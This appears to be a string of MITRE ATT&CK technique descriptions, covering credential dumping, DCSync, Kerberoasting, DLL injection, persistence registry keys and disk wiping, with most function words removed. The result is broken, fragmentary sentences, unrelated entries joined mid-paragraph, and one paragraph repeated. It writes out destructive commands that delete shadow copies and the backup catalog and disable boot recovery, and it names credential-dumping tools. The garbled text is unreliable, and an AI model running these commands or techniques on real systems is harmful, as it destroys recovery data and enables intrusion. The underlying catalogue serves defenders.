Adversaries gather ways, direct elicitation [Phishing Information](https://attack.mitre.org/techniques/T1598). Physical locations target organization exposed adversaries online accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594) [Social Media](https://attack.mitre.org/techniques/T1593/001)).(Citation: ThreatPost Broadvoice Leak)(Citation: EDGAR Search) Gathering reveal opportunities forms reconnaissance (ex: [Phishing Information](https://attack.mitre.org/techniques/T1598) [Search Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) [Hardware Additions](https://attack.mitre.org/techniques/T1200)). Adversaries abuse Office "Office Test" Registry key persistence compromised system. Office Registry location exists user arbitrary DLL executed time Office application started. Registry key load DLLs testing debugging purposes developing Office applications. Registry key created default Office installation.(Citation: Hexacorn Office Test)(Citation: Palo Alto Office Sofacy)

There exist user global Registry Office feature:

* <code>HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Office test\Special\Perf</code>

Adversaries add Registry key malicious DLL executed Office application, Word Excel, started. Adversaries build capabilities targeting. purchasing, freely downloading, stealing capabilities, adversaries develop capabilities in-house. process identifying development requirements building solutions malware, exploits, self-signed certificates. Adversaries develop capabilities support operations numerous phases adversary lifecycle.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: Bitdefender StrongPity June 2020)(Citation: Talos Promethium June 2020)

As legitimate development efforts, skill sets required developing capabilities. skills located in-house, contracted out. contractor considered extension adversary's development capabilities, adversary plays role shaping requirements maintains degree exclusivity capability. Windows Dynamic Data Exchange (DDE) client-server protocol one-time continuous inter-process communication (IPC) applications. link established, applications autonomously exchange transactions consisting strings, warm data links (notifications data item changes), hot data links (duplications data item), requests command execution.

Object Linking Embedding (OLE), ability link data documents, originally implemented DDE. superseded COM, DDE enabled Windows Office 2016 Registry keys. (Citation: BleepingComputer DDE Disabled Word Dec 2017) (Citation: ADV170021 Dec 2017) (Citation: DDE Advisory Nov 2017)

Adversaries DDE execute arbitrary commands. Office documents poisoned DDE commands (Citation: SensePost PS DDE 2016) (Citation: Kettle CSV DDE Aug 2014), embedded files (Citation: Enigma Reviving DDE Jan 2018), deliver execution phishing campaigns hosted content, avoiding Visual Basic Applications (VBA) macros. (Citation: SensePost MacroLess DDE Oct 2017) DDE leveraged adversary operating compromised machine direct access command execution. Adversaries attempt access create Active Directory domain database steal credential information, domain devices, users, access rights. default, NTDS file (NTDS.dit) located <code>%SystemRoot%\NTDS\Ntds.dit</code> domain controller.(Citation: Wikipedia Active Directory)

In addition NTDS files active Domain Controllers, adversaries search backups information.(Citation: Metcalf 2015)

The tools techniques enumerate NTDS file contents entire Active Directory hashes.

* Volume Shadow Copy
* secretsdump.py
* in-built Windows tool, ntdsutil.exe
* Invoke-NinjaCopy
 Adversaries target Management Base (MIB) collect valuable network managed Simple Network Management Protocol (SNMP).

The MIB configuration repository stores variable accessible SNMP form object identifiers (OID). OID identifies variable read set permits active management tasks, configuration changes, remote modification variables. SNMP administrators insight systems, as, information, description hardware, physical location, software packages(Citation: SANS Security Reading Securing SNMP Securing SNMP). MIB device operational information, including running configuration, routing table, interface details.

Adversaries SNMP queries collect MIB content SNMP-managed devices collect network adversary build network maps facilitate future targeted exploitation.(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)  Adversaries steganographic techniques hide command control traffic detection efforts difficult. Steganographic techniques hide data digital messages transferred systems. hidden command control compromised systems. cases, passing files embedded steganography, image document files, command control.  adversary rely user clicking malicious link gain execution. Users subjected social engineering link lead code execution. user action typically observed follow-on behavior [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Clicking link lead execution techniques exploitation browser application vulnerability [Exploitation Client Execution](https://attack.mitre.org/techniques/T1203). Links lead users download files require execution [Malicious File](https://attack.mitre.org/techniques/T1204/002). Adversaries stolen application access tokens bypass typical authentication process access restricted accounts, information, services remote systems. tokens typically stolen users services lieu login credentials.

Application access tokens authorized API requests behalf user service commonly access resources cloud container-based applications software-as-a-service (SaaS).(Citation: Auth0 - Access Tokens Secure APIs Sept 2019) 

In AWS GCP environments, adversaries trigger request short-lived access token privileges user account.(Citation: Google Cloud Service Account Credentials)(Citation: AWS Temporary Security Credentials) adversary token request data perform actions original account not. permissions feature misconfigured – example, allowing users request token account - adversary gain initial access Cloud Account escalate privileges.(Citation: Rhino Security Labs Enumerating AWS Roles)

OAuth commonly implemented framework issues tokens users access systems. frameworks collaboratively verify user determine actions user allowed perform. identity established, token actions authorized, passing actual credentials user. Therefore, compromise token grant adversary access resources sites malicious application.(Citation: okta)

For example, cloud-based email service OAuth access token granted malicious application, gain long-term access features user account "refresh" token enabling background access awarded.(Citation: Identity Platform Access 2019) OAuth access token adversary user-granted REST API perform functions email searching contact enumeration.(Citation: Staaldraad Phishing OAuth 2017)

Compromised access tokens initial step compromising services. example, token grants access victim’s primary email, adversary extend access services target subscribes triggering forgotten password routines. Direct API access token negates effectiveness authentication factor immune intuitive countermeasures changing passwords. Access abuse API channel difficult detect service provider end, access align legitimate workflow. Adversaries modify add LSASS drivers persistence compromised systems. Windows security subsystem set components manage enforce security policy domain. Local Security Authority (LSA) main component responsible local security policy user authentication. LSA includes multiple dynamic link libraries (DLLs) security functions, context LSA Subsystem Service (LSASS) lsass.exe process.(Citation: Security Subsystem)

Adversaries target LSASS drivers persistence. replacing adding illegitimate drivers [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)), adversary LSA operations continuously execute malicious payloads. Adversaries abuse Windows service control manager execute malicious commands payloads. Windows service control manager (<code>services.exe</code>) interface manage manipulate services.(Citation: Service Control Manager) service control manager accessible users GUI components utilities <code>sc.exe</code> [Net](https://attack.mitre.org/software/S0039).

[PsExec](https://attack.mitre.org/software/S0029) execute commands payloads temporary Windows service created service control manager API.(Citation: Russinovich Sysinternals) Tools [PsExec](https://attack.mitre.org/software/S0029) <code>sc.exe</code> accept remote servers arguments conduct remote execution.

Adversaries leverage mechanisms execute malicious content. executing modified service. technique execution conjunction [Windows Service](https://attack.mitre.org/techniques/T1543/003) service persistence privilege escalation. Adversaries abuse credentials cloud account gaining Initial Access, Persistence, Privilege Escalation, Defense Evasion. Cloud accounts created configured organization users, remote support, services, administration resources cloud service provider SaaS application. cases, cloud accounts federated traditional identity management system, Window Active Directory.(Citation: AWS Identity Federation)(Citation: Google Federating GC)(Citation: Deploying Federation)

Compromised credentials cloud accounts harvest sensitive data online storage accounts databases. Access cloud accounts abused gain Initial Access network abusing [Trusted Relationship](https://attack.mitre.org/techniques/T1199). [Domain Accounts](https://attack.mitre.org/techniques/T1078/002), compromise federated cloud accounts adversaries easily laterally environment.

Once cloud account compromised, adversary perform [Account Manipulation](https://attack.mitre.org/techniques/T1098) - example, adding [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) - maintain persistence escalate privileges. Adversaries environmentally key payloads features malware evade defenses constraint execution specific target environment. Environmental keying cryptography constrain execution actions based adversary supplied environment specific conditions expected target. Environmental keying implementation [Execution Guardrails](https://attack.mitre.org/techniques/T1480) utilizes cryptographic techniques deriving encryption/decryption specific types values computing environment.(Citation: EK Clueless Agents)

Values derived target-specific elements generate decryption key encrypted payload. Target-specific values derived specific network shares, physical devices, software/software versions, files, joined domains, time, local/external IP addresses.(Citation: Kaspersky Gauss Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware) generating decryption target-specific environmental values, environmental keying sandbox detection, anti-virus detection, crowdsourcing information, reverse engineering difficult.(Citation: Kaspersky Gauss Whitepaper)(Citation: Ebowla: Genetic Malware) difficulties slow incident response process adversaries hide tactics, techniques, procedures (TTPs).

Similar [Obfuscated Files Information](https://attack.mitre.org/techniques/T1027), adversaries environmental keying protect TTPs evade detection. Environmental keying deliver encrypted payload target target-specific values decrypt payload execution.(Citation: Kaspersky Gauss Whitepaper)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware)(Citation: Demiguise Guardrail Router Logo) utilizing target-specific values decrypt payload adversary avoid packaging decryption key payload sending monitored network connection. Depending technique gathering target-specific values, reverse engineering encrypted payload exceptionally difficult.(Citation: Kaspersky Gauss Whitepaper) prevent exposure capabilities environments intended compromised operated within.

Like [Execution Guardrails](https://attack.mitre.org/techniques/T1480), environmental keying prevent exposure capabilities environments intended compromised operated within. activity distinct typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) involve checking sandbox values continuing execution match, environmental keying involve checking expected target-specific match decryption subsequent execution successful. Adversaries fallback alternate communication channels primary channel compromised inaccessible maintain reliable command control avoid data transfer thresholds. Adversaries NTFS file attributes hide malicious data evade detection. Technology File (NTFS) formatted partition Master File Table (MFT) maintains record file/directory partition. (Citation: SpectorOps Host-Based Jul 2017) MFT entries file attributes, (Citation: NTFS File Attributes Aug 2010) Extended Attributes (EA) Data [known Alternate Data Streams (ADSs) Data attribute present], store arbitrary data (and complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: ADS Mar 2014)

Adversaries store malicious data binaries file attribute metadata files. evade defenses, static indicator scanning tools anti-virus. (Citation: Journey ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015) Adversaries abuse valid Kerberos ticket-granting ticket (TGT) sniff network traffic ticket-granting service (TGS) ticket vulnerable [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) 

Service principal names (SPNs) uniquely identify instance Windows service. enable authentication, Kerberos requires SPNs service logon account (an account tasked running service(Citation: Detecting Kerberoasting Feb 2018)).(Citation: SPN)(Citation: SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)

Adversaries possessing valid Kerberos ticket-granting ticket (TGT) request Kerberos ticket-granting service (TGS) service tickets SPN domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Portions tickets encrypted RC4 algorithm, meaning Kerberos 5 TGS-REP etype 23 hash service account SPN private key vulnerable offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks expose plaintext credentials.(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)

This behavior executed service tickets captured network traffic.(Citation: AdSecurity Cracking Kerberos Dec 2015)

Cracked hashes enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), [Lateral Movement](https://attack.mitre.org/tactics/TA0008) access [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014) Technology File (NTFS) formatted partition Master File Table (MFT) maintains record file/directory partition. (Citation: SpectorOps Host-Based Jul 2017) MFT entries file attributes, (Citation: NTFS File Attributes Aug 2010) Extended Attributes (EA) Data [known Alternate Data Streams (ADSs) Data attribute present], store arbitrary data (and complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: ADS Mar 2014)

Adversaries store malicious data binaries file attribute metadata files. evade defenses, static indicator scanning tools anti-virus. (Citation: Journey ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015) Adversaries attempt access credentials sensitive abusing Windows Domain Controller's application programming interface (API)(Citation: DRSR Dec 2017) (Citation: GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) simulate replication process remote domain controller technique called DCSync.

Members Administrators, Domain Admins, Enterprise Admin accounts domain controller DCSync pull password data(Citation: ADSecurity Mimikatz DCSync) Active Directory, include current historical hashes accounts KRBTGT Administrators. hashes create [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) [Pass Ticket](https://attack.mitre.org/techniques/T1550/003)(Citation: Harmj0y Mimikatz DCSync) change account's password [Account Manipulation](https://attack.mitre.org/techniques/T1098).(Citation: InsiderThreat ChangeNTLM July 2017)

DCSync functionality included "lsadump" module [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: GitHub Mimikatz lsadump Module) Lsadump includes NetSync, performs DCSync legacy replication protocol.(Citation: NRPC Dec 2017) adversary gather time time zone local remote system. time set stored Windows Time Service domain maintain time synchronization systems services enterprise network. (Citation: MSDN Time) (Citation: Technet Windows Time Service)

System time gathered ways, [Net](https://attack.mitre.org/software/S0039) Windows performing <code>net time \\hostname</code> gather time remote system. victim's time zone inferred current time gathered <code>w32tm /tz</code>. (Citation: Technet Windows Time Service)

This performing techniques, executing file [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) (Citation: RSA EU12 Inside), discover locality based time zone assist victim targeting [System Location Discovery](https://attack.mitre.org/techniques/T1614)). Adversaries knowledge time time bomb, delaying execution date/time.(Citation: AnyRun TimeBomb) Adversaries abuse [at](https://attack.mitre.org/software/S0110) utility perform task scheduling initial recurring execution malicious code. [at](https://attack.mitre.org/software/S0110) utility exists executable Windows, Linux, macOS scheduling tasks time date. deprecated favor [Scheduled Task](https://attack.mitre.org/techniques/T1053/005)'s [schtasks](https://attack.mitre.org/software/S0111) Windows environments, [at](https://attack.mitre.org/software/S0110) requires Task Scheduler service running, user logged local Administrators group.

On Linux macOS, [at](https://attack.mitre.org/software/S0110) invoked superuser users <code>at.allow</code> file. <code>at.allow</code> file exist, <code>at.deny</code> file checked. username listed <code>at.deny</code> allowed invoke [at](https://attack.mitre.org/software/S0110). <code>at.deny</code> exists empty, global [at](https://attack.mitre.org/software/S0110) permitted. file exists (which baseline) superuser allowed [at](https://attack.mitre.org/software/S0110).(Citation: Linux at)

Adversaries [at](https://attack.mitre.org/software/S0110) execute programs startup scheduled basis [Persistence](https://attack.mitre.org/tactics/TA0003). [at](https://attack.mitre.org/software/S0110) abused conduct remote [Execution](https://attack.mitre.org/tactics/TA0002) [Lateral Movement](https://attack.mitre.org/tactics/TA0008) process context account (such SYSTEM).

In Linux environments, adversaries abuse [at](https://attack.mitre.org/software/S0110) break restricted environments task spawn interactive commands. Similarly, [at](https://attack.mitre.org/software/S0110) [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) binary allowed superuser <code>sudo</code>.(Citation: GTFObins at) Adversaries execute binary, command, script method interacts Windows services, Service Control Manager. creating service modifying existing service. technique execution conjunction [New Service](https://attack.mitre.org/techniques/T1050) [Modify Existing Service](https://attack.mitre.org/techniques/T1031) service persistence privilege escalation. Adversaries inject dynamic-link libraries (DLLs) processes evade process-based defenses elevate privileges. DLL injection method executing arbitrary code address space separate live process.  

DLL injection commonly performed writing path DLL virtual address space target process loading DLL invoking thread. write performed native Windows API calls <code>VirtualAllocEx</code> <code>WriteProcessMemory</code>, invoked <code>CreateRemoteThread</code> (which calls <code>LoadLibrary</code> API responsible loading DLL). (Citation: Elastic Process Injection July 2017) 

Variations method reflective DLL injection (writing self-mapping DLL process) memory module (map DLL writing process) overcome address relocation issue additional APIs invoke execution (since methods load execute files memory manually preforming function <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) 

Another variation method, referred Module Stomping/Overloading DLL Hollowing, leveraged conceal injected code process. method involves loading legitimate DLL remote process manually overwriting module's <code>AddressOfEntryPoint</code> starting thread target process.(Citation: Module Stomping Shellcode Injection) variation attackers hide malicious injected code execution legitimate DLL file disk.(Citation: Hiding Malicious Code Module Stomping) 

Running code context process access process's memory, system/network resources, elevated privileges. Execution DLL injection evade detection security products execution masked legitimate process.  PowerShell powerful interactive command-line interface scripting environment included Windows operating system. (Citation: TechNet PowerShell) Adversaries PowerShell perform actions, including discovery execution code. Examples include Start-Process cmdlet executable Invoke-Command cmdlet runs command locally remote computer. 

PowerShell download executables Internet, executed disk memory touching disk.

Administrator permissions required PowerShell connect remote systems.

A PowerShell-based offensive testing tools available, including [Empire](https://attack.mitre.org/software/S0363),  PowerSploit, (Citation: Powersploit) PSAttack. (Citation: Github PSAttack)

PowerShell commands/scripts executed invoking powershell.exe binary interfaces PowerShell's underlying System.Management.Automation assembly exposed .NET framework Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015) (Citation: PSfromCsharp APR 2014) Adversaries buy, steal, download exploits targeting. exploit takes advantage bug vulnerability unintended unanticipated behavior occur hardware software. developing exploits, adversary find/modify exploits online purchase exploit vendors.(Citation: Exploit Database)(Citation: TempertonDarkHotel)(Citation: NationsBuying)

In addition downloading exploits internet, adversaries purchase exploits third-party entities. Third-party entities include technology companies specialize exploit development, criminal marketplaces (including exploit kits), individuals.(Citation: PegasusCitizenLab)(Citation: Wired SandCat Oct 2019) addition purchasing exploits, adversaries steal repurpose exploits third-party entities (including adversaries).(Citation: TempertonDarkHotel)

An adversary monitor exploit provider forums understand existing, newly discovered, exploits. delay exploit discovered public. adversary target systems conduct exploit development gain knowledge subsequent operation.

Adversaries exploits phases adversary lifecycle [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation Remote Services](https://attack.mitre.org/techniques/T1210), [Application Exploitation](https://attack.mitre.org/techniques/T1499/004)). Adversaries modify authentication mechanisms processes access user credentials enable unwarranted access accounts. authentication process handled mechanisms, Local Security Authentication Server (LSASS) process Security Accounts Manager (SAM) Windows, pluggable authentication modules (PAM) Unix-based systems, authorization plugins MacOS systems, responsible gathering, storing, validating credentials. modifying authentication process, adversary authenticate service [Valid Accounts](https://attack.mitre.org/techniques/T1078).

Adversaries maliciously modify process reveal credentials bypass authentication mechanisms. Compromised credentials access bypass access controls resources systems network persistent access remote systems externally services, VPNs, Outlook Access remote desktop. Adversaries hook Windows application programming interface (API) functions collect user credentials. Malicious hooking mechanisms capture API calls include parameters reveal user authentication credentials.(Citation: TrojanSpy:Win32/Ursnif.gen!I Sept 2017) [Keylogging](https://attack.mitre.org/techniques/T1056/001),  technique focuses API functions include parameters reveal user credentials. Hooking involves redirecting calls functions implemented via:

* **Hooks procedures**, intercept execute designated code response events messages, keystrokes, mouse inputs.(Citation: Hook Overview)(Citation: Elastic Process Injection July 2017)
* **Import address table (IAT) hooking**, modifications process’s IAT, pointers imported API functions stored.(Citation: Elastic Process Injection July 2017)(Citation: Adlice Software IAT Hooks Oct 2014)(Citation: MWRInfoSecurity Dynamic Hooking 2015)
* **Inline hooking**, overwrites bytes API function redirect code flow.(Citation: Elastic Process Injection July 2017)(Citation: HighTech Bridge Inline Hooking Sept 2011)(Citation: MWRInfoSecurity Dynamic Hooking 2015)
 Adversaries overwrite corrupt flash memory contents BIOS firmware devices attached render inoperable unable boot, denying availability devices system.(Citation: Symantec Chernobyl W95.CIH) Firmware software loaded executed non-volatile memory hardware devices initialize manage device functionality. devices include motherboard, hard drive, video cards.

In general, adversaries manipulate, overwrite, corrupt firmware deny devices. example, corruption firmware responsible loading operating network devices render network devices inoperable.(Citation: dhs_threat_to_net_devices)(Citation: cisa_malware_orgs_ukraine) Depending device, attack result [Data Destruction](https://attack.mitre.org/techniques/T1485).  Adversaries delete remove built-in operating data services designed aid recovery corrupted prevent recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) deny access backups recovery options.

Operating systems features corrupted systems, backup catalog, volume shadow copies, automatic repair features. Adversaries disable delete recovery features augment effects [Data Destruction](https://attack.mitre.org/techniques/T1485) [Data Encrypted Impact](https://attack.mitre.org/techniques/T1486).(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017)

A native Windows utilities adversaries disable delete recovery features:

* <code>vssadmin.exe</code> delete volume shadow copies - <code>vssadmin.exe delete shadows /all /quiet</code>
* [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) delete volume shadow copies - <code>wmic shadowcopy delete</code>
* <code>wbadmin.exe</code> delete Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>
* <code>bcdedit.exe</code> disable automatic Windows recovery features modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code> Adversaries establish persistence executing malicious content triggered Netsh Helper DLLs. Netsh.exe (also referred Netshell) command-line scripting utility interact network configuration system. functionality add helper DLLs extending functionality utility.(Citation: TechNet Netsh) paths registered netsh.exe helper DLLs entered Windows Registry <code>HKLM\SOFTWARE\Microsoft\Netsh</code>.

Adversaries netsh.exe helper DLLs trigger execution arbitrary code persistent manner. execution anytime netsh.exe executed, happen automatically, persistence technique, software (ex: VPN) executes netsh.exe normal functionality.(Citation: Github Netsh Helper Beacon)(Citation: Demaske Netsh Persistence) Adversaries send spearphishing messages third-party services attempt gain access victim systems. Spearphishing service specific variant spearphishing. forms spearphishing employs party services enterprise email channels. 

All forms spearphishing electronically delivered social engineering targeted specific individual, company, industry. scenario, adversaries send messages social media services, personal webmail, non-enterprise controlled services. services less-strict security policy enterprise. kinds spearphishing, goal generate rapport target target's way. Adversaries create fake social media accounts message employees potential job opportunities. plausible reason services, policies, software running environment. adversary send malicious links attachments services.

A common build rapport target social media, send content personal webmail service target computer. adversary bypass email restrictions account, target file expecting. payload expected, adversary continue normal communications troubleshoot target working. Adversaries internal proxy direct command control traffic systems compromised environment. tools exist enable traffic redirection proxies port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries internal proxies manage command control communications compromised environment, reduce simultaneous outbound network connections, provide resiliency connection loss, ride existing trusted communications paths infected systems avoid suspicion. Internal proxy connections common peer-to-peer (p2p) networking protocols, SMB, blend environment.

By compromised internal proxy, adversaries conceal true destination C2 traffic reducing numerous connections external systems. Adversaries trusted scripts, signed certificates, proxy execution malicious files. signed scripts downloaded default Windows installations proxy execution files.(Citation: LOLBAS Project) behavior abused adversaries execute malicious files bypass application control signature validation systems.(Citation: GitHub Ultimate AppLocker Bypass List) Adversaries communicate custom command control protocol encapsulating commands/data existing [Application Layer Protocol](https://attack.mitre.org/techniques/T1071). Implementations include mimicking well-known protocols developing custom protocols (including raw sockets) fundamental protocols TCP/IP/another standard network stack. Adversaries existing, legitimate external service host additional command control (C2) infrastructure. Adversaries post content, dead drop resolver, services embedded (and obfuscated/encoded) domains IP addresses. infected, victims reach redirected resolvers.

Popular websites social media acting mechanism C2 cover likelihood hosts network communicating prior compromise. common services, offered Google Twitter, easier adversaries hide expected noise. service providers commonly SSL/TLS encryption, adversaries level protection.

Use dead drop resolver protect back-end C2 infrastructure discovery malware binary analysis enabling operational resiliency (since infrastructure dynamically changed). InstallUtil command-line utility installation uninstallation resources executing specific installer components .NET binaries. (Citation: MSDN InstallUtil) InstallUtil located .NET directories Windows system: <code>C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe</code> <code>C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe</code>. InstallUtil.exe digitally signed Microsoft.

Adversaries InstallUtil proxy execution code trusted Windows utility. InstallUtil bypass process whitelisting attributes binary execute class decorated attribute <code>[System.ComponentModel.RunInstaller(true)]</code>. (Citation: LOLBAS Installutil) Adversaries add junk data protocols command control detection difficult. adding random meaningless data protocols command control, adversaries prevent trivial methods decoding, deciphering, analyzing traffic. Examples include appending/prepending data junk characters writing junk characters characters.  Adversaries send spearphishing messages third-party services elicit sensitive targeting. Spearphishing attempt trick targets divulging information, frequently credentials actionable information. Spearphishing frequently involves social engineering techniques, posing source reason collect (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) sending multiple, seemingly urgent messages.

All forms spearphishing electronically delivered social engineering targeted specific individual, company, industry. scenario, adversaries send messages social media services, personal webmail, non-enterprise controlled services.(Citation: ThreatPost Social Media Phishing) services less-strict security policy enterprise. kinds spearphishing, goal generate rapport target target's way. Adversaries create fake social media accounts message employees potential job opportunities. plausible reason services, policies, environment. Adversaries previous reconnaissance efforts (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) craft persuasive believable lures. **This technique deprecated. [Non-Standard Port](https://attack.mitre.org/techniques/T1571) appropriate.**

Adversaries communicate commonly port bypass firewalls network detection systems blend normal network activity avoid detailed inspection. commonly ports as

* TCP:80 (HTTP)
* TCP:443 (HTTPS)
* TCP:25 (SMTP)
* TCP/UDP:53 (DNS)

They protocol port completely protocol. 

For connections occur internally enclave (such proxy pivot node nodes), examples common ports 

* TCP/UDP:135 (RPC)
* TCP/UDP:22 (SSH)
* TCP/UDP:3389 (RDP) Adversaries gather credentials APIs containers environment. APIs environments, Docker API Kubernetes APIs, user remotely manage container resources cluster components.(Citation: Docker API)(Citation: Kubernetes API)

An adversary access Docker API collect logs credentials cloud, container, resources environment.(Citation: Unit 42 Unsecured Docker Daemons) adversary sufficient permissions, pod's service account, Kubernetes API retrieve credentials Kubernetes API server. credentials include Docker API authentication secrets Kubernetes cluster components.  Adversaries hijack domains subdomains targeting. Domain registration hijacking changing registration domain permission original registrant.(Citation: ICANNDomainNameHijacking) Adversaries gain access email account person listed owner domain. adversary claim forgot password domain registration. possibilities include social engineering domain registration desk gain access account advantage renewal process gaps.(Citation: Krebs DNS Hijack 2019)

Subdomain hijacking occur organizations DNS entries non-existent deprovisioned resources. cases, adversary control subdomain conduct operations benefit trust domain.(Citation: Takeover 2020) Adversaries abuse SQL stored procedures establish persistent access systems. SQL Stored Procedures code saved reused database users waste time rewriting frequently SQL queries. Stored procedures invoked SQL statements database procedure defined events (e.g. SQL server application started/restarted).

Adversaries craft malicious stored procedures provide persistence mechanism SQL database servers.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019) execute operating commands SQL syntax adversary enable additional functionality, xp_cmdshell MSSQL Server.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019)(Citation: xp_cmdshell 2017) 

Microsoft SQL Server enable common language runtime (CLR) integration. CLR integration enabled, application developers write stored procedures .NET framework language (e.g. VB .NET, C#, etc.).(Citation: CLR Integration 2017) Adversaries craft modify CLR assemblies linked stored procedures CLR assemblies execute arbitrary commands.(Citation: NetSPI SQL Server CLR)  Adversaries [Patch Image](https://attack.mitre.org/techniques/T1601/001) hard code password operating system, bypassing native authentication mechanisms local accounts network devices.

[Modify Image](https://attack.mitre.org/techniques/T1601) include implanted code operating network devices provide access adversaries specific password.  modification includes specific password implanted operating image patch.  authentication attempts, inserted code check user input password. so, access granted. Otherwise, implanted code pass credentials verification valid credentials.(Citation: Mandiant - Synful Knock) Adversaries erase contents storage devices specific systems network interrupt availability network resources.

Adversaries partially completely overwrite contents storage device rendering data irrecoverable storage interface.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: DOJ Lazarus Sony 2018) wiping specific disk structures files, adversaries destructive intent wipe arbitrary portions disk content. wipe disk content, adversaries acquire direct access hard drive overwrite arbitrarily sized portions disk random data.(Citation: Novetta Blockbuster Destructive Malware) Adversaries observed leveraging third-party drivers [RawDisk](https://attack.mitre.org/software/S0364) access disk content.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) behavior distinct [Data Destruction](https://attack.mitre.org/techniques/T1485) sections disk erased individual files.

To maximize impact target organization operations network-wide availability interruption goal, malware wiping disk content worm-like features propagate network leveraging additional techniques [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware) Adversaries steal data exfiltrating un-encrypted network protocol existing command control channel. data alternate network location main command control server. 

Adversaries opt obfuscate data, encryption, network protocols natively unencrypted (such HTTP, FTP, DNS). include custom publicly encoding/compression algorithms (such base64) embedding data protocol headers fields.  Adversaries execute payloads placing malicious dynamic library (dylib) expected path victim application searches runtime. dynamic loader dylibs based sequential search paths. Paths dylibs prefixed <code>@rpath</code>, developers relative paths array search paths runtime based location executable.  Additionally, weak linking used, <code>LC_LOAD_WEAK_DYLIB</code> function, application execute expected dylib present. Weak linking enables developers application multiple macOS versions APIs added.

Adversaries gain execution inserting malicious dylibs missing dylib identified path.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Wardle Dylib Hijacking OSX 2015)(Citation: Github EmpireProject HijackScanner)(Citation: Github EmpireProject CreateHijacker Dylib) Dylibs loaded application's address space allowing malicious dylib inherit application's privilege level resources. Based application, result privilege escalation uninhibited network access. method evade detection security products execution masked legitimate process.(Citation: Writing Bad Malware OSX)(Citation: wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection MachO) Adversaries install version operating network device weaken security.  operating versions network devices weaker encryption ciphers and, general, fewer/less updated defensive features. (Citation: Cisco Synful Knock Evolution)

On embedded devices, downgrading version typically requires replacing operating file storage.  embedded devices, achieved downloading desired version operating file reconfiguring device boot file restart.  adversary restart device implement change wait time restarts.

